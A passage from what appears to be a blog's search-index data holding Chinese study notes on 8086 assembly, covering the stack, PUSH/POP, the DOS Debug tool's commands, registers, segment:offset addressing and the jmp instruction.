Out)。\n这个是什么意思呢？可以把栈看作一个放书的盒子，依次放3本书进去的时候，需要取出放进去的第一本书的时候，就会先把上面的两本书依次拿出来，才能取到放进去的第一本书。\n当需要取出哪一本书的时候，我们总会先拿出最上面的那一本书，不然无法拿到需要的书，而每取出一本书，下一本总是在最上面。\n在程序化的角度上来说是应该有一个标记，这个标记中指向最上面的书，也就是栈顶，如下图所示：\n现今的CPU中都有栈的设计，包含8086，既然有栈的设计，肯定也有对栈访问的指令，其中最基本的就是PUSH（入栈）和POP（出栈），比如push ax代表将ax寄存器的数据送入栈中，入栈和出栈都是字型数据操作，比如下图是一个操作栈的例子：\n虽然说现在可以操作栈了，但是有两个疑问：\n栈中的数据存储在哪里？ 上面说到，有一个标记，总是指向栈顶，那这个栈顶在哪里？ 上面两个问题可以归于一个，其实栈也是在内存单元中，只是它是一段特殊访问方式的空间，那既然是内存单元，那可能也有类似与段寄存器和偏移寄存器这样的寄存器来指向栈，它们就是SS:SP。\nSS存放栈的段地址，而SP存放栈的偏移地址，SS:SP在任意时刻指向的是栈顶，我们可以通过修改SS和SP来指定哪一段内存单元为栈，那么现在就可以很好的解释push和pop指令的工作方式，比如push ax的执行，由以下两部分完成：\nSP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶起前面的单元为新栈顶。 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。 上面的步骤可以用下图来表示：\n从图中可以看出，8086CPU中，入栈时，由栈顶高地址向低地址增长，而出栈就是由低地址到高地址增长。\n栈顶超界 可以想象一下，当栈空间为2000H:0000H-2000H:000FH的16个内存单元时，那么当栈为空，栈顶在0010H位置，如果这时我们操作出栈，那么SP应该+2，即为0012H，那如果入栈低于了20000H这个内存空间的时候呢？这两种情况都超出了栈的范围，就会覆盖相应的内存单元的数据，比如在下面两个图中，分别对出栈和入栈都演示了一个超界的情况：\n在内存单元中，可能存放数据，代码，也有可能存放其他应用的数据代码等，如果超出了就会出现其他未知的问题，在8086CPU中，并没有什么机制来预防这样的问题，应为8086CPU只需要关注栈顶在哪里，并不会关注栈的空间有多大，所以我们需要特别注意，这是非常危险的一个操作。\n","permalink":"https://wuyizhou.com/posts/learning-assembly-4/","summary":"内存中字的储存 在8086CPU中，寄存器为16位，可以储存一个字(1Word=2Byte)，拿ax来说，低8位放在al中，高8位放在ah中。\n在内存单元一个内存单元只能存储一个字节，那么如果存储一个字型数据就会用到两个内存单元，低8位放在低地址当中，高8位放在高地址当中，比如下图中，储存了两个字型数据，一个是4E20H，一个是0012H，它们的存放数据大概如下：\n而当连续两个内存单元储存的是一个字型数据的时候，可以将这字型数据的起始地址称为N地址字单元，比如00001内存单元和00002内存单元，可以直接称为00001地址字单元。\n数据的读写 在第二章中写到如何操作CPU的执行指令，让内存中的数据当作指令还是数据都取决于程序员，当CS和IP指向的地址则当作指令执行，那读取数据也需要由段地址和偏移地址组成。\n8086CPU中，数据地址的段地址由段寄存器DS来指定，并且不能直接将数据送入DS段寄存器，只能通过其他寄存器来传送给段寄存器DS（这是8086CPU的硬件设计，只需要知道就可以了），那偏移地址呢？\n先来看看下面的代码，下面的代码是通过ax寄存器把内存单元2000H段地址传送给DS，然后读取内存单元2000段中的0001单元：\nmov bx,2000H mov ds,bx mov al,[0001H] 偏移地址是由程序员手动输入的，当编译器看见[]的时候，会自动把段寄存器DS中的值与[]号中数据进行合成为一个20位的物理地址，然后读取这个物理地址中的数据。\n那么如何把寄存器中的数据写入内存中呢？只需要将两个位置相关换一下，就可以了，比如下面代码，把ax的低位寄存器al中的12H数据写入内存2000段中的0001单元。\nmov bx,2000H mov ds,bx mov al,12H mov [0001H],al 字型数据传送 8086CPU是16位架构，那么意味着一次性可以传输16位数据，上面操作的都是8位数据，也可以传输16位数据，只需要给出16位寄存器的名字就可以传送了，但是16位寄存器分两个内存单元储存，一个内存单元只能储存8位数据，比如储存一个8E20H数据到2000:0000内存单元中，那么20H储存在2000:0000中，而8E储存在2000:0001中。\nCPU提供的栈以及机制 栈是一种特殊方式访问的内存单元，那么它有什么用呢？以后会慢慢来说到，在这里只是先对栈空间有一个大概的认识，栈的特殊性在于后进先出，英文缩写为LIFO(Last in First Out)。\n这个是什么意思呢？可以把栈看作一个放书的盒子，依次放3本书进去的时候，需要取出放进去的第一本书的时候，就会先把上面的两本书依次拿出来，才能取到放进去的第一本书。\n当需要取出哪一本书的时候，我们总会先拿出最上面的那一本书，不然无法拿到需要的书，而每取出一本书，下一本总是在最上面。\n在程序化的角度上来说是应该有一个标记，这个标记中指向最上面的书，也就是栈顶，如下图所示：\n现今的CPU中都有栈的设计，包含8086，既然有栈的设计，肯定也有对栈访问的指令，其中最基本的就是PUSH（入栈）和POP（出栈），比如push ax代表将ax寄存器的数据送入栈中，入栈和出栈都是字型数据操作，比如下图是一个操作栈的例子：\n虽然说现在可以操作栈了，但是有两个疑问：\n栈中的数据存储在哪里？ 上面说到，有一个标记，总是指向栈顶，那这个栈顶在哪里？ 上面两个问题可以归于一个，其实栈也是在内存单元中，只是它是一段特殊访问方式的空间，那既然是内存单元，那可能也有类似与段寄存器和偏移寄存器这样的寄存器来指向栈，它们就是SS:SP。\nSS存放栈的段地址，而SP存放栈的偏移地址，SS:SP在任意时刻指向的是栈顶，我们可以通过修改SS和SP来指定哪一段内存单元为栈，那么现在就可以很好的解释push和pop指令的工作方式，比如push ax的执行，由以下两部分完成：\nSP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶起前面的单元为新栈顶。 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。 上面的步骤可以用下图来表示：\n从图中可以看出，8086CPU中，入栈时，由栈顶高地址向低地址增长，而出栈就是由低地址到高地址增长。\n栈顶超界 可以想象一下，当栈空间为2000H:0000H-2000H:000FH的16个内存单元时，那么当栈为空，栈顶在0010H位置，如果这时我们操作出栈，那么SP应该+2，即为0012H，那如果入栈低于了20000H这个内存空间的时候呢？这两种情况都超出了栈的范围，就会覆盖相应的内存单元的数据，比如在下面两个图中，分别对出栈和入栈都演示了一个超界的情况：\n在内存单元中，可能存放数据，代码，也有可能存放其他应用的数据代码等，如果超出了就会出现其他未知的问题，在8086CPU中，并没有什么机制来预防这样的问题，应为8086CPU只需要关注栈顶在哪里，并不会关注栈的空间有多大，所以我们需要特别注意，这是非常危险的一个操作。","title":"汇编语言学习笔记（四）：寄存器[内存访问]"},{"content":"什么是Debug？Debug是DOS、Windows提供的8086程序调试工具，可以查看CPU各种寄存器的内容，内存情况和机器码级跟踪程序的运行。\nDebug一共有20多个命令，但我们在目前为止会使用到Debug的6个命令：\nR命令：查看、改变寄存器的内容 D命令：查看内存中的内容 E命令：改写内存中的内容 U命令：将内存中的机器指令翻译成汇编指令 T命令：执行一条机器指令 A命令：以汇编指令的格式向内存中写入一条机器指令 Windows下的Debug 在Windows下自带提供了Debug，可以直接通过Window提供的DOS进入到Debug，可以通过开始命令，输入cmd然后进入到DOS界面后直接输入Debug后就进行Debug程序了。\nMac下的Debug 在Mac下，你需要通过Boxer这个程序来模拟DOS环境，打开后类似于这样的界面：\n点击Open a DOS prompt后就会弹出如下的界面，可以在这个环境下使用任何的DOS界面：\n但是这个DOS环境只包含了最基础的DOS环境，所以这个DOS环境是不带Debug程序的，你需要下载一个Debug程序或者下载由我提供的一个学习汇编需要的程序包，然后解压后把这个文件夹拖放进DOS窗口后，你就会看见Boxer提供的DOS环境会自动把这个目录加载成C盘，这样就可以正常使用Debug程序了，类似于下图这样：\n进入界面后，你会看见一个\u0026quot;-\u0026ldquo;后面跟着闪烁的下划线，说明已经进入Debug。\nR命令 R命令有两个作用：\n查看当前CPU的各个寄存器状态、以及当前CS、IP指向的代码以及机器指令翻译后的汇编指令。 修改各个寄存器的内容 输入r后，会返回当前CPU的各个寄存器状态，就如下图这样：\n如果需要修改某个寄存器的内容，可以通过r命令后跟一个寄存器的命令，比如r ax，输入后会返回一个ax当前寄存器的内容，然后会有一个提示符:等待输入，比如下图中，通过r ax命令设置ax的内容为1000H：\nD命令 通过下面的格式可以查看需要的内容中的内容：\nd 段地址:偏移地址 比如下图用d命令查看内容20000H处的内容：\n返回的内容中包含了三个显示部分：\n第一部分位于最左边类似于2000:0000，是每行开始的第一个内存单元的段地址和偏移地址。 第二部分位于中间的十六进制编码，是开始部分的内存单元一直显示128个内存单元的内容，而每行等于16个字节，注意在每行在第八个内存单元的后面会有一个-来分割，有利于我们辨识。 第三部分位于最右边，是每个内存单元中的数据可以对应显示的ASCII，如果没有对应的ASCII码，就会用.代替。 还有一种限制D命令输出的方式，可以通过使用结束偏移地址来限制D命令的返回结果，它的格式为：\nd 段地址:偏移地址 结束偏移地址 比如下图中只需要返回内存地址为2000:0000到2000:0009的十个内存单元的内容：\nE命令 e 段地址:偏移地址 可以通过E命令来改写内存中的内容，不管是汇编指令还是数据。\n通过E命令可以连续更改也可以更改一个内存单元，当修改指定内存单元的内容时，会把当前内存单元的内容显示出来，然后用一个.号连接需要写入的数据，比如需要修改内存单元20000H的内容为10，然后再用d命令查看修改后的内容：\n当然也可以连续修改指定内存单元后的连续内存单元中的内容，只需要在输入需要写入的内存单元后按空格间，会自动跳到下一个内存单元进行修改，直到按回车键，就会写入内存：\nU命令 u命令会将某一段内存单元中的内容翻译成汇编指令，并返回16个内存单元的内容，返回的内容中包含三部分：\n每一条机器指令的地址 对应的机器指令 对应的汇编指令 比如查看内存单元2000:0000的数据，并翻译成汇编指令：\n当然也可以限制返回的内容，比如下面返回内存单元2000:0000到内存单元2000:0009的汇编指令：\n这里需要注意的是在计算机中储存在内存单元中的不管是数据还是代码，都是以二进制形式储存的，所以是代码还是数据，得看程序员怎么去控制。\nT命令 T命令是执行当前CS和IP指向的内存单元中的汇编指令，执行后IP自动增加代码长度并正确的指向到下一个代码的内存单元：\nA命令 以汇编指令的方式写入到内存单元，格式为：\na 段地址:偏移地址 当指定修改某一个内存单元的内容时，会显示出当前修改的内存单元地址，并等待输入汇编指令，当输入完成后会自动跳到上一条代码长度后的内存单元继续等待输入，如果不想继续写入汇编指令，按回车键就结束写入。\n比如下图中，通过在内存单元20000H处以汇编指令形式写入：\nmov ax,20 并通过u命令查看内存单元20000H处是否写入成功：\n并且再通过r命令查看当前AX寄存器的内容，然后修改CS和IP寄存器，让CPU代码指针指向20000H处\n然后用t命令执行，再次查看AX寄存器的结果：\n","permalink":"https://wuyizhou.com/posts/learning-assembly-3/","summary":"什么是Debug？Debug是DOS、Windows提供的8086程序调试工具，可以查看CPU各种寄存器的内容，内存情况和机器码级跟踪程序的运行。\nDebug一共有20多个命令，但我们在目前为止会使用到Debug的6个命令：\nR命令：查看、改变寄存器的内容 D命令：查看内存中的内容 E命令：改写内存中的内容 U命令：将内存中的机器指令翻译成汇编指令 T命令：执行一条机器指令 A命令：以汇编指令的格式向内存中写入一条机器指令 Windows下的Debug 在Windows下自带提供了Debug，可以直接通过Window提供的DOS进入到Debug，可以通过开始命令，输入cmd然后进入到DOS界面后直接输入Debug后就进行Debug程序了。\nMac下的Debug 在Mac下，你需要通过Boxer这个程序来模拟DOS环境，打开后类似于这样的界面：\n点击Open a DOS prompt后就会弹出如下的界面，可以在这个环境下使用任何的DOS界面：\n但是这个DOS环境只包含了最基础的DOS环境，所以这个DOS环境是不带Debug程序的，你需要下载一个Debug程序或者下载由我提供的一个学习汇编需要的程序包，然后解压后把这个文件夹拖放进DOS窗口后，你就会看见Boxer提供的DOS环境会自动把这个目录加载成C盘，这样就可以正常使用Debug程序了，类似于下图这样：\n进入界面后，你会看见一个\u0026quot;-\u0026ldquo;后面跟着闪烁的下划线，说明已经进入Debug。\nR命令 R命令有两个作用：\n查看当前CPU的各个寄存器状态、以及当前CS、IP指向的代码以及机器指令翻译后的汇编指令。 修改各个寄存器的内容 输入r后，会返回当前CPU的各个寄存器状态，就如下图这样：\n如果需要修改某个寄存器的内容，可以通过r命令后跟一个寄存器的命令，比如r ax，输入后会返回一个ax当前寄存器的内容，然后会有一个提示符:等待输入，比如下图中，通过r ax命令设置ax的内容为1000H：\nD命令 通过下面的格式可以查看需要的内容中的内容：\nd 段地址:偏移地址 比如下图用d命令查看内容20000H处的内容：\n返回的内容中包含了三个显示部分：\n第一部分位于最左边类似于2000:0000，是每行开始的第一个内存单元的段地址和偏移地址。 第二部分位于中间的十六进制编码，是开始部分的内存单元一直显示128个内存单元的内容，而每行等于16个字节，注意在每行在第八个内存单元的后面会有一个-来分割，有利于我们辨识。 第三部分位于最右边，是每个内存单元中的数据可以对应显示的ASCII，如果没有对应的ASCII码，就会用.代替。 还有一种限制D命令输出的方式，可以通过使用结束偏移地址来限制D命令的返回结果，它的格式为：\nd 段地址:偏移地址 结束偏移地址 比如下图中只需要返回内存地址为2000:0000到2000:0009的十个内存单元的内容：\nE命令 e 段地址:偏移地址 可以通过E命令来改写内存中的内容，不管是汇编指令还是数据。\n通过E命令可以连续更改也可以更改一个内存单元，当修改指定内存单元的内容时，会把当前内存单元的内容显示出来，然后用一个.号连接需要写入的数据，比如需要修改内存单元20000H的内容为10，然后再用d命令查看修改后的内容：\n当然也可以连续修改指定内存单元后的连续内存单元中的内容，只需要在输入需要写入的内存单元后按空格间，会自动跳到下一个内存单元进行修改，直到按回车键，就会写入内存：\nU命令 u命令会将某一段内存单元中的内容翻译成汇编指令，并返回16个内存单元的内容，返回的内容中包含三部分：\n每一条机器指令的地址 对应的机器指令 对应的汇编指令 比如查看内存单元2000:0000的数据，并翻译成汇编指令：\n当然也可以限制返回的内容，比如下面返回内存单元2000:0000到内存单元2000:0009的汇编指令：\n这里需要注意的是在计算机中储存在内存单元中的不管是数据还是代码，都是以二进制形式储存的，所以是代码还是数据，得看程序员怎么去控制。\nT命令 T命令是执行当前CS和IP指向的内存单元中的汇编指令，执行后IP自动增加代码长度并正确的指向到下一个代码的内存单元：\nA命令 以汇编指令的方式写入到内存单元，格式为：\na 段地址:偏移地址 当指定修改某一个内存单元的内容时，会显示出当前修改的内存单元地址，并等待输入汇编指令，当输入完成后会自动跳到上一条代码长度后的内存单元继续等待输入，如果不想继续写入汇编指令，按回车键就结束写入。\n比如下图中，通过在内存单元20000H处以汇编指令形式写入：\nmov ax,20 并通过u命令查看内存单元20000H处是否写入成功：\n并且再通过r命令查看当前AX寄存器的内容，然后修改CS和IP寄存器，让CPU代码指针指向20000H处\n然后用t命令执行，再次查看AX寄存器的结果：","title":"汇编语言学习笔记（三）：初识Debug"},{"content":"为什么要了解寄存器 为什么了解寄存器？因为CPU是计算机的大脑，可以通过指令读写寄存器实现对CPU的控制，你试想一下如果你的大脑不能控制只能控制手和脚等，不就等于扯线木偶了？\n寄存器只是CPU内部的一个器件，对于汇编来说CPU中比较重要的三个器件：\n运算器：对数据进行处理 控制器：控制各种器件工作 寄存器：对数据进行储存 而在CPU内部，这三个器件包括其他器件都是靠CPU内部总线相连，这里的内部总线是指的CPU内部器件的总线，而上一章节说的总线是CPU与外部器件比如显卡、内存等器件的总线。\n8086CPU 每个CPU寄存器和结构都是不相同的，而王爽《汇编语言》第三版主要讲的是在8086CPU上面操作的汇编，所以我这个笔记(教程)也是跟着王爽《汇编语言》第三版这本书学习。\n在8086CPU中有14个寄存器，并且每个寄存器都是16位(2Byte)，每个寄存器的名字不一样，这些寄存器的名字分别为：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。而关于这些寄存器的作用，需要用的时候再去理解，现在就当认识一下啦～\n通用寄存器 AX、BX、CX、DX这四个寄存器可以来存放一般的数据，所以通常称为通用寄存器。以AX寄存器为例，寄存器的逻辑结构为下图：\n8086CPU每个寄存器都是16位，2而8086上一代CPU的寄存器为8位，所以8086CPU为了保证兼容性，AX、BX、CX、DX这四个寄存器都可以分为两个独立的8位寄存器来使用。\nAX可分为：AH和AL BX可分为：BH和BL CX可分为：CH和CL DX可分为：DH和DL 而这些命名也是有规律的，AH表示AX寄存器的高8位，AL表示AX寄存器的低8位。以AX为例，AX寄存器分为两个独立8为寄存器的逻辑结构为下图：\n为了保证兼容性8086CPU同时也可以处理两种尺寸的数据：\n字节：byte，一个字节由8个bit组成，可以存放在8位寄存器中，比如AH、AL 字：word，一个字由两个字节组成，可以直接放在16位寄存器中，比如AX 下图是数据20000(十六进制为4E20H)保存在寄存器AX当中的示意图：\n如果把AX寄存器当作一个整体看，那么里面的值就是字型数据20000(4E20H)，如果把寄存器分成两个8位寄存器看，那么AH就是字节型数据78(4EH)，而AL就是字节型数据32(20H)。\n几条汇编指令 通过下面几条简单的汇编指令来熟悉一下汇编指令，至于其他的一些汇编指令会在后期介绍。下面表中会列出汇编指令和相应的指令含义。\n在汇编语言当中，如果你操作寄存器的时候需要运算的字节大小超过了寄存器能存储的大小，CPU会抛弃高位(但是CPU并不是真正的丢弃这个值，后面会说到为什么)，保留相应的低位，什么意思呢？比如下面的汇编指令：\nmov ah,88H add ah,ah 上面代码运算后的结果为110H，但是因为操作的是8位寄存器，也就是只能保存两个16进制(16进制一个位等于4位二进制，两个16进制等于8位二进制)，所以这里CPU丢去了高位1H，保留了10H。而这种情况同样在16位中也会有。\n16位结构的CPU 之前提到过8086CPU上一代CPU是8位CPU，而8086CPU是16位CPU，那么什么是16位CPU？什么是8位CPU？有三个方面来描述CPU的结构特性：\n运算器最多一次性可以计算16位数据 寄存器最多一次性能存储16位数据 寄存器和运算器之间最多一次性能传输16位数据 **通过上面简单的说，就是说8086CPU能一次性处理、传输、暂存信息的长度为16位。**那32位计算机呢？同样是一次性处理、传输、暂存信息的长度为32位。\n物理地址 在上一章节说过CPU会把所有储存器看成一个一维线性空间，每个储存器在这个空间中都有自己的地址，我们将这个地址称为物理地址，比如就像下图一样：\n而CPU访问存储器的时候是通过地址总线来寻址的，而寻址必须通过物理地址来寻址。\n在CPU向地址总线发出物理地址之前需要先在内部形成这个一维的线性空间，那么物理地址是怎样形成的呢？不同的CPU可以有不同的形成物理地址的方式，下面来讨论一下8086CPU形成物理地址的方式。\n8086CPU给出物理地址的方法 8086CPU有20位地址总线用于相连外部的存储器，最多可以传输20位地址。在将物理地址发出到地址总线寻址之前，必须在CPU中处理、传输、暂存，而8086CPU是16位结构的CPU，意味着8086只能一次性发出16位的地址，也意味着只有64KB的寻址能力，所以8086CPU在设计上采用了用两个16位地址来合成20位的物理地址的方法。\n它的大概实现就是由CPU的相关部件提供两个16位地址，一个为段地址，一个为偏移地址，他们通过CPU内部的一个地址加法器计算这个地址得到一个20位的物理地址，然后通过CPU内部的地址总线传输到地址总线上进行寻址，比如下图：\n而这个地址加法器采用的计算方式是物理地址=基础地址(段地址X16)+偏移地址，比如8086CPU要访问123C8H内存单元的时候，地址加法器的工作流程大致如下：\n关于这样的计算方式，还有一种更为常见的说法是左移4位，因为上面的物理地址都是用16进制表示的，而一位16进制等于4位二进制。在计算机存储的任何信息都是以二进制存放的，所以这里指的左移4位，是指的二进制左移4位，而二进制左移4位相当于16进制X16，相当于10进制的该数乘以2的4次方，下图中可以很好的对比数据：\n比如我们要访问一个内存单元，用描述来说“数据在21F60H当中”，这句话对于8086PC机一般不这样描述，一般用两种说法表示：\n数据存在内存2000:1F60单元中 数据存在内存的2000段中的1F60单元中 段的概念 说到段，可能都会误认为储存器是分为一段一段的，实际上不是，因为CPU把所有的储存器看作一个一维的线性空间，所以CPU把所有的储存器看作的都是一个整体。\n而这个划分来自于CPU的寻址方式，因为8086CPU用的是“基础地址(段地址X16+偏移地址)”得到的，所以使我们可以分段的管理这些内存，但是需要知道的是段地址X16必然是16的倍数，而偏移地址位16位，所以一个段最大长度为64KB，比如下图中表示的两个“段”：\n在这个之前提到过，段地址是由相关部件提供的，这个部件也是寄存器，但是它只用来存放段地址，所以称为段寄存器，在8086中有4个段寄存器，分别有4个：CS、DS、SS、ES。当8086CPU要访问内存时，由这4个段寄存器提供内存单位的段地址，这里先看看CS。\nCS段寄存器和IP指令指针寄存器 因为在计算机中储存的数据都是二进制，计算机并不知道这些二进制是代码还是数据，所以数据和代码是完全由程序员说了算，而怎么来让计算机知道这是代码？这是数据？通过CS和IP寄存器。\nCS和IP是8086CPU中最为关键的两个寄存器，这两个寄存器指示了CPU当前要读取的指令地址。\nCS为代码段寄存器，IP为指令指针寄存器，在8086CPU中通过CSX16+IP得到需读取执行的代码，当每次执行代码后IP的值会自动加上当前已经读取执行的代码长度，以使CPU可以正确的执行一下一条命令。\n所以CS和IP是表示的CPU任意时刻当前需要读取执行的代码，下图中是一个CPU读取执行代码的过程：\n在8086CPU加电或复位后（即CPU刚开始工作的时候）CS和IP被设置为CS=FFFFH，IP=0000H，也就是说8086PC机刚启动的时候，FFFF0H内存单元中的指令是8086PC机启动后执行的第一条指令。\n修改CS和IP 程序员可以通过修改CS、IP到达控制CPU执行哪一段代码，我们之前可以通过传送指令MOV来修改通用寄存器，但是传送指令MOV并不能来修改CS、IP寄存器，而8086CPU提供了另外的指令来改变CS、IP的值，这一类指令我们统称为转移指令。\njmp指令就是一条简单的转移指令，它的作用是用指令修改当前CPU需要执行的代码内存单元地址，通过修改CS的段地址以及IP的偏移地址。它的使用方法是：\njmp 段地址:偏移地址 它可以直接修改CS和IP寄存器的值，比如下面这样：\njmp 2AE3:3，执行后：CS=2AE3H，IP=0003H，CPU将从内存单元2AE33H执行指令。 jmp 3:0B16，执行后：CS=0003H，IP=0B16H，CPU将从内存单元00B46H执行指令。 我们也可以只修改IP偏移地址：\njmp ax 执行后把ax中的数据传送到IP寄存器中 执行前：ax=1000H,CS=2000H,IP=0000H 执行后：ax=1000H,CS=2000H,IP=1000H jmp bx 执行后把bx中的数据传送到IP寄存器中 执行前：bx=3000H,CS=2000H,IP=0000H 执行后：bx=3000H,CS=2000H,IP=3000H 8086CPU工作过程 从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲区 IP指向下一条指令 执行指令（转到步骤1，重复过程） ","permalink":"https://wuyizhou.com/posts/learning-assembly-2/","summary":"为什么要了解寄存器 为什么了解寄存器？因为CPU是计算机的大脑，可以通过指令读写寄存器实现对CPU的控制，你试想一下如果你的大脑不能控制只能控制手和脚等，不就等于扯线木偶了？\n寄存器只是CPU内部的一个器件，对于汇编来说CPU中比较重要的三个器件：\n运算器：对数据进行处理 控制器：控制各种器件工作 寄存器：对数据进行储存 而在CPU内部，这三个器件包括其他器件都是靠CPU内部总线相连，这里的内部总线是指的CPU内部器件的总线，而上一章节说的总线是CPU与外部器件比如显卡、内存等器件的总线。\n8086CPU 每个CPU寄存器和结构都是不相同的，而王爽《汇编语言》第三版主要讲的是在8086CPU上面操作的汇编，所以我这个笔记(教程)也是跟着王爽《汇编语言》第三版这本书学习。\n在8086CPU中有14个寄存器，并且每个寄存器都是16位(2Byte)，每个寄存器的名字不一样，这些寄存器的名字分别为：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。而关于这些寄存器的作用，需要用的时候再去理解，现在就当认识一下啦～\n通用寄存器 AX、BX、CX、DX这四个寄存器可以来存放一般的数据，所以通常称为通用寄存器。以AX寄存器为例，寄存器的逻辑结构为下图：\n8086CPU每个寄存器都是16位，2而8086上一代CPU的寄存器为8位，所以8086CPU为了保证兼容性，AX、BX、CX、DX这四个寄存器都可以分为两个独立的8位寄存器来使用。\nAX可分为：AH和AL BX可分为：BH和BL CX可分为：CH和CL DX可分为：DH和DL 而这些命名也是有规律的，AH表示AX寄存器的高8位，AL表示AX寄存器的低8位。以AX为例，AX寄存器分为两个独立8为寄存器的逻辑结构为下图：\n为了保证兼容性8086CPU同时也可以处理两种尺寸的数据：\n字节：byte，一个字节由8个bit组成，可以存放在8位寄存器中，比如AH、AL 字：word，一个字由两个字节组成，可以直接放在16位寄存器中，比如AX 下图是数据20000(十六进制为4E20H)保存在寄存器AX当中的示意图：\n如果把AX寄存器当作一个整体看，那么里面的值就是字型数据20000(4E20H)，如果把寄存器分成两个8位寄存器看，那么AH就是字节型数据78(4EH)，而AL就是字节型数据32(20H)。\n几条汇编指令 通过下面几条简单的汇编指令来熟悉一下汇编指令，至于其他的一些汇编指令会在后期介绍。下面表中会列出汇编指令和相应的指令含义。\n在汇编语言当中，如果你操作寄存器的时候需要运算的字节大小超过了寄存器能存储的大小，CPU会抛弃高位(但是CPU并不是真正的丢弃这个值，后面会说到为什么)，保留相应的低位，什么意思呢？比如下面的汇编指令：\nmov ah,88H add ah,ah 上面代码运算后的结果为110H，但是因为操作的是8位寄存器，也就是只能保存两个16进制(16进制一个位等于4位二进制，两个16进制等于8位二进制)，所以这里CPU丢去了高位1H，保留了10H。而这种情况同样在16位中也会有。\n16位结构的CPU 之前提到过8086CPU上一代CPU是8位CPU，而8086CPU是16位CPU，那么什么是16位CPU？什么是8位CPU？有三个方面来描述CPU的结构特性：\n运算器最多一次性可以计算16位数据 寄存器最多一次性能存储16位数据 寄存器和运算器之间最多一次性能传输16位数据 **通过上面简单的说，就是说8086CPU能一次性处理、传输、暂存信息的长度为16位。**那32位计算机呢？同样是一次性处理、传输、暂存信息的长度为32位。\n物理地址 在上一章节说过CPU会把所有储存器看成一个一维线性空间，每个储存器在这个空间中都有自己的地址，我们将这个地址称为物理地址，比如就像下图一样：\n而CPU访问存储器的时候是通过地址总线来寻址的，而寻址必须通过物理地址来寻址。\n在CPU向地址总线发出物理地址之前需要先在内部形成这个一维的线性空间，那么物理地址是怎样形成的呢？不同的CPU可以有不同的形成物理地址的方式，下面来讨论一下8086CPU形成物理地址的方式。\n8086CPU给出物理地址的方法 8086CPU有20位地址总线用于相连外部的存储器，最多可以传输20位地址。在将物理地址发出到地址总线寻址之前，必须在CPU中处理、传输、暂存，而8086CPU是16位结构的CPU，意味着8086只能一次性发出16位的地址，也意味着只有64KB的寻址能力，所以8086CPU在设计上采用了用两个16位地址来合成20位的物理地址的方法。\n它的大概实现就是由CPU的相关部件提供两个16位地址，一个为段地址，一个为偏移地址，他们通过CPU内部的一个地址加法器计算这个地址得到一个20位的物理地址，然后通过CPU内部的地址总线传输到地址总线上进行寻址，比如下图：\n而这个地址加法器采用的计算方式是物理地址=基础地址(段地址X16)+偏移地址，比如8086CPU要访问123C8H内存单元的时候，地址加法器的工作流程大致如下：\n关于这样的计算方式，还有一种更为常见的说法是左移4位，因为上面的物理地址都是用16进制表示的，而一位16进制等于4位二进制。在计算机存储的任何信息都是以二进制存放的，所以这里指的左移4位，是指的二进制左移4位，而二进制左移4位相当于16进制X16，相当于10进制的该数乘以2的4次方，下图中可以很好的对比数据：\n比如我们要访问一个内存单元，用描述来说“数据在21F60H当中”，这句话对于8086PC机一般不这样描述，一般用两种说法表示：\n数据存在内存2000:1F60单元中 数据存在内存的2000段中的1F60单元中 段的概念 说到段，可能都会误认为储存器是分为一段一段的，实际上不是，因为CPU把所有的储存器看作一个一维的线性空间，所以CPU把所有的储存器看作的都是一个整体。\n而这个划分来自于CPU的寻址方式，因为8086CPU用的是“基础地址(段地址X16+偏移地址)”得到的，所以使我们可以分段的管理这些内存，但是需要知道的是段地址X16必然是16的倍数，而偏移地址位16位，所以一个段最大长度为64KB，比如下图中表示的两个“段”：\n在这个之前提到过，段地址是由相关部件提供的，这个部件也是寄存器，但是它只用来存放段地址，所以称为段寄存器，在8086中有4个段寄存器，分别有4个：CS、DS、SS、ES。当8086CPU要访问内存时，由这4个段寄存器提供内存单位的段地址，这里先看看CS。\nCS段寄存器和IP指令指针寄存器 因为在计算机中储存的数据都是二进制，计算机并不知道这些二进制是代码还是数据，所以数据和代码是完全由程序员说了算，而怎么来让计算机知道这是代码？这是数据？通过CS和IP寄存器。\nCS和IP是8086CPU中最为关键的两个寄存器，这两个寄存器指示了CPU当前要读取的指令地址。\nCS为代码段寄存器，IP为指令指针寄存器，在8086CPU中通过CSX16+IP得到需读取执行的代码，当每次执行代码后IP的值会自动加上当前已经读取执行的代码长度，以使CPU可以正确的执行一下一条命令。\n所以CS和IP是表示的CPU任意时刻当前需要读取执行的代码，下图中是一个CPU读取执行代码的过程：\n在8086CPU加电或复位后（即CPU刚开始工作的时候）CS和IP被设置为CS=FFFFH，IP=0000H，也就是说8086PC机刚启动的时候，FFFF0H内存单元中的指令是8086PC机启动后执行的第一条指令。\n修改CS和IP 程序员可以通过修改CS、IP到达控制CPU执行哪一段代码，我们之前可以通过传送指令MOV来修改通用寄存器，但是传送指令MOV并不能来修改CS、IP寄存器，而8086CPU提供了另外的指令来改变CS、IP的值，这一类指令我们统称为转移指令。\njmp指令就是一条简单的转移指令，它的作用是用指令修改当前CPU需要执行的代码内存单元地址，通过修改CS的段地址以及IP的偏移地址。它的使用方法是：\njmp 段地址:偏移地址 它可以直接修改CS和IP寄存器的值，比如下面这样：\njmp 2AE3:3，执行后：CS=2AE3H，IP=0003H，CPU将从内存单元2AE33H执行指令。 jmp 3:0B16，执行后：CS=0003H，IP=0B16H，CPU将从内存单元00B46H执行指令。 我们也可以只修改IP偏移地址：","title":"汇编语言学习笔记（二）：寄存器"},{"content":"前言 此文章如出现歧义或错误的地方请谅解，这篇文章是我在学习汇编的时候同时记录下来的笔记，然后通过教程的方式发表出来，因为通过这样的方式发表出来，可以锻炼自己的语言组织能力，并且能够把问题思考懂了，然后再通过初学者的角度来记录这片文章，从而巩固自己的知识。如果有任何错误歧义的地方，可以通过邮箱与我取得联系。\n为什么学习汇编？ 首先在现在用汇编语言来写用户层面上的应用是很少的了，当然也有一些应用比如驱动、boot loader等。既然已经很少有人用汇编写用户层面的应用了，但是为什么要学习？因为汇编语言是作用于硬件上工作的语言，有便于理解计算机工作的原理，以后学习高级语言更为有利，特别是对于反汇编、破解这一块的技术对汇编语言的学习是必须的。\n机器语言 